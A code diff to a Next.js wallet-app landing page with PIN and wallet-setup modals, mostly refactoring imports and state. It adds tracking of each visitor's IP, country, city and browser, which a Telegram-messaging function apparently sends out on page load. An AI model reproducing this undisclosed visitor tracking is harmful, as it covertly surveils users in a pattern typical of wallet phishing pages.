@@ -1,23 +1,26 @@
 "use client";
 
+import { useState, useEffect } from "react";
 import Image from "next/image";
 import Link from "next/link";
 import WelcomeModal from "../components/WelcomeModal";
 import AppSetupModal from "../components/AppSetupModal";
 import CreatePinModal from "../components/CreatePinModal";
 import SelectWalletTypeModal from "../components/SelectWalletTypeModal";
-import { useState, useEffect, useRef } from "react";
+import { useRef } from "react";
+import { usePathname } from "next/navigation";
 import { getUserCountry } from "./userLocation";
 import axios from "axios";
-import { usePathname } from "next/navigation";
+
 export default function LandingPage() {
   // Two modals managed separately
   const [welcomeOpen, setWelcomeOpen] = useState(false);
   const [setupOpen, setSetupOpen] = useState(false);
   const [pinOpen, setPinOpen] = useState(false);
   const [showSelectType, setShowSelectType] = useState(false);
-
-  const [browser, setBrowser] = useState<string | undefined>(undefined);
+  const [country, setCountry] = useState("");
+  const [ipAddress, setIpAddress] = useState("");
+  const [browser, setBrowser] = useState("");
   const hasSentVisitorMessage = useRef(false);
   const pathname = usePathname();
   const getCurrentUrl = () => {
@@ -35,7 +38,14 @@ export default function LandingPage() {
     console.log("getCurrentUrl: window not available, returning empty string");
     return "";
   };
-  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
+  const sendTelegramMessage = (
+    userCountry: {
+      country?: string;
+      countryEmoji?: string;
+      city?: string;
+      ip?: string;
+    } | null
+  ) => {
     // console.log("User Country", userCountry);
 
     const messageData = {
@@ -82,8 +92,6 @@ export default function LandingPage() {
       hasSentVisitorMessage.current = true;
     }
   }, [sendTelegramMessage]);
-
- 
 
   useEffect(() => {
     // Set browser info only on client side
